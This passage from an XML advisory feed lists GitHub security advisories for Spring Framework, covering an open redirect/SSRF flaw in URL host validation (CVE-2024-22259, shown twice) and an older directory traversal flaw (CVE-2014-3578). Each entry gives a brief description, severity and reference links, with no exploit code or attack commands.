<li><a href="https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb">https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501">https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68">https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68</a></li>
<li><a href="https://github.com/advisories/GHSA-hgjh-9rj2-g67j">https://github.com/advisories/GHSA-hgjh-9rj2-g67j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hgjh-9rj2-g67j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-16T06:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-web] Spring Framework URL Parsing with Host Validation Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hgjh-9rj2-g67j</id>
        <link href="https://github.com/advisories/GHSA-hgjh-9rj2-g67j"/>
        <updated>2024-03-18T16:20:32.000Z</updated>
        <content type="html"><![CDATA[<p>Applications that use UriComponentsBuilder in Spring Framework&nbsp;to parse an externally provided URL (e.g. through a query parameter) AND&nbsp;perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect <a href="https://cwe.mitre.org/data/definitions/601.html">https://cwe.mitre.org/data/definitions/601.html</a> &nbsp;attack or to a SSRF attack if the URL is used after passing validation checks.</p>
<p>This is the same as  CVE-2024-22243 <a href="https://spring.io/security/cve-2024-22243">https://spring.io/security/cve-2024-22243</a>, but with different input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22259">https://nvd.nist.gov/vuln/detail/CVE-2024-22259</a></li>
<li><a href="https://spring.io/security/cve-2024-22259">https://spring.io/security/cve-2024-22259</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb">https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501">https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68">https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68</a></li>
<li><a href="https://github.com/advisories/GHSA-hgjh-9rj2-g67j">https://github.com/advisories/GHSA-hgjh-9rj2-g67j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hgjh-9rj2-g67j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-16T06:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-web] Spring Framework URL Parsing with Host Validation Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-hgjh-9rj2-g67j</id>
        <link href="https://github.com/advisories/GHSA-hgjh-9rj2-g67j"/>
        <updated>2024-03-18T16:20:32.000Z</updated>
        <content type="html"><![CDATA[<p>Applications that use UriComponentsBuilder in Spring Framework&nbsp;to parse an externally provided URL (e.g. through a query parameter) AND&nbsp;perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect <a href="https://cwe.mitre.org/data/definitions/601.html">https://cwe.mitre.org/data/definitions/601.html</a> &nbsp;attack or to a SSRF attack if the URL is used after passing validation checks.</p>
<p>This is the same as  CVE-2024-22243 <a href="https://spring.io/security/cve-2024-22243">https://spring.io/security/cve-2024-22243</a>, but with different input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22259">https://nvd.nist.gov/vuln/detail/CVE-2024-22259</a></li>
<li><a href="https://spring.io/security/cve-2024-22259">https://spring.io/security/cve-2024-22259</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb">https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501">https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68">https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68</a></li>
<li><a href="https://github.com/advisories/GHSA-hgjh-9rj2-g67j">https://github.com/advisories/GHSA-hgjh-9rj2-g67j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hgjh-9rj2-g67j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-16T06:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.springframework:spring-core] Improper Limitation of a Pathname to a Restricted Directory in Spring Framework]]></title>
        <id>https://github.com/advisories/GHSA-rhcg-rwhx-qj3j</id>
        <link href="https://github.com/advisories/GHSA-rhcg-rwhx-qj3j"/>
        <updated>2024-03-18T15:04:59.000Z</updated>
        <content type="html"><![CDATA[<p>Directory traversal vulnerability in Pivotal Spring Framework 3.x before 3.2.9 and 4.0 before 4.0.5 allows remote attackers to read arbitrary files via a crafted URL.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-3578">https://nvd.nist.gov/vuln/detail/CVE-2014-3578</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1131882">https://bugzilla.redhat.com/show_bug.cgi?id=1131882</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2019/07/msg00012.html">https://lists.debian.org/debian-lts-announce/2019/07/msg00012.html</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2015-0234.html">https://rhn.redhat.com/errata/RHSA-2015-0234.html</a></li>
<li><a href="https://rhn.redhat.com/errata/RHSA-2015-0235.html">https://rhn.redhat.com/errata/RHSA-2015-0235.html</a></li>
<li><a href="http://jvn.jp/en/jp/JVN49154900/index.html">http://jvn.jp/en/jp/JVN49154900/index.html</a></li>
<li><a href="http://jvndb.jvn.jp/jvndb/JVNDB-2014-000054">http://jvndb.jvn.jp/jvndb/JVNDB-2014-000054</a></li>
<li><a href="http://pivotal.io/security/cve-2014-3578">http://pivotal.io/security/cve-2014-3578</a></li>
<li><a href="http://rhn.redhat.com/errata/RHSA-2015-0720.html">http://rhn.redhat.com/errata/RHSA-2015-0720.html</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/issues/16414">https://github.com/spring-projects/spring-framework/issues/16414</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/748167bfa33c3c69db2d8dbdc3a0e9da692da3a0">https://github.com/spring-projects/spring-framework/commit/748167bfa33c3c69db2d8dbdc3a0e9da692da3a0</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/8ee465103850a3dca018273fe5952e40d5c45a66">https://github.com/spring-projects/spring-framework/commit/8ee465103850a3dca018273fe5952e40d5c45a66</a></li>
<li><a href="https://github.com/spring-projects/spring-framework/commit/f6fddeb6eb7da625fd711ab371ff16512f431e8d">https://github.com/spring-projects/spring-framework/commit/f6fddeb6eb7da625fd711ab371ff16512f431e8d</a></li>
<li><a href="https://github.com/advisories/GHSA-rhcg-rwhx-qj3j">https://github.com/advisories/GHSA-rhcg-rwhx-qj3j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rhcg-rwhx-qj3j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T00:56:29.000Z</published>
    </entry>
</feed>